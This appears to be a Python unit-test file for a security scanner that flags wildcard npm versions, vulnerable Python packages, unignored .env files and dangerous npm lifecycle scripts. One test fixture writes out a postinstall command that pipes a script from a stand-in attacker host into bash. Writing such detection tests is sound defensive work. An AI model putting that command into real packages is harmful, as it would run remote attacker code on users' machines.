"""Unit tests for Dependency (SCA) and Configuration / Git security scanners."""

import json
from pathlib import Path

from cry.models import Category, Severity
from cry.scanners.config_audit import scan_configurations, scan_gitignore_protection
from cry.scanners.dependencies import scan_package_json, scan_requirements_txt


def test_detects_wildcard_npm_dependency(tmp_path: Path) -> None:
    """Ensure wildcards in package.json are flagged."""
    pkg_file = tmp_path / "package.json"
    pkg_data = {
        "name": "vulnerable-app",
        "dependencies": {
            "express": "*",
        },
    }
    pkg_file.write_text(json.dumps(pkg_data), encoding="utf-8")

    findings = scan_package_json(pkg_file, tmp_path)
    assert len(findings) == 1
    f = findings[0]
    assert f.category == Category.INSECURE_DEPENDENCY
    assert f.severity == Severity.HIGH
    assert "Wildcard" in f.title


def test_detects_malicious_npm_lifecycle_script(tmp_path: Path) -> None:
    """Ensure suspicious preinstall/postinstall scripts are flagged as critical."""
    pkg_file = tmp_path / "package.json"
    pkg_data = {
        "name": "malicious-app",
        "scripts": {
            "postinstall": "curl -s http://attacker.com/payload.sh | bash",
        },
    }
    pkg_file.write_text(json.dumps(pkg_data), encoding="utf-8")

    findings = scan_package_json(pkg_file, tmp_path)
    assert len(findings) == 1
    f = findings[0]
    assert f.category == Category.INSECURE_DEPENDENCY
    assert f.severity == Severity.CRITICAL
    assert "Dangerous Package Lifecycle Script" in f.title


def test_detects_vulnerable_python_package(tmp_path: Path) -> None:
    """Ensure known CVEs in requirements.txt are caught."""
    req_file = tmp_path / "requirements.txt"
    req_file.write_text("requests==2.28.1\nurllib3==1.25.10\n", encoding="utf-8")

    findings = scan_requirements_txt(req_file, tmp_path)
    assert len(findings) == 2
    pkg_names = [f.title for f in findings]
    assert any("requests" in title for title in pkg_names)
    assert any("urllib3" in title for title in pkg_names)


def test_detects_unprotected_env_file_missing_from_gitignore(tmp_path: Path) -> None:
    """Ensure unignored .env files trigger a critical blocker."""
    env_file = tmp_path / ".env"
    env_file.write_text("DATABASE_URL=postgres://...\n", encoding="utf-8")

    gitignore_file = tmp_path / ".gitignore"
    gitignore_file.write_text("node_modules/\n.venv/\n", encoding="utf-8")

    findings = scan_gitignore_protection(tmp_path)
    assert len(findings) == 1
    f = findings[0]
    assert f.severity == Severity.CRITICAL
    assert ".env" in f.title


def test_safe_when_env_file_properly_ignored(tmp_path: Path) -> None:
    """Ensure safe repositories with ignored .env produce 0 configuration findings."""
    env_file = tmp_path / ".env"
    env_file.write_text("API_KEY=test\n", encoding="utf-8")

    gitignore_file = tmp_path / ".gitignore"
    gitignore_file.write_text(".env\n*.local\n.venv/\n", encoding="utf-8")

    findings = scan_gitignore_protection(tmp_path)
    assert len(findings) == 0


def test_config_audit_full_run_on_clean_dir(tmp_path: Path) -> None:
    """Ensure empty or clean directory produces zero findings."""
    findings = scan_configurations(tmp_path)
    assert len(findings) == 0
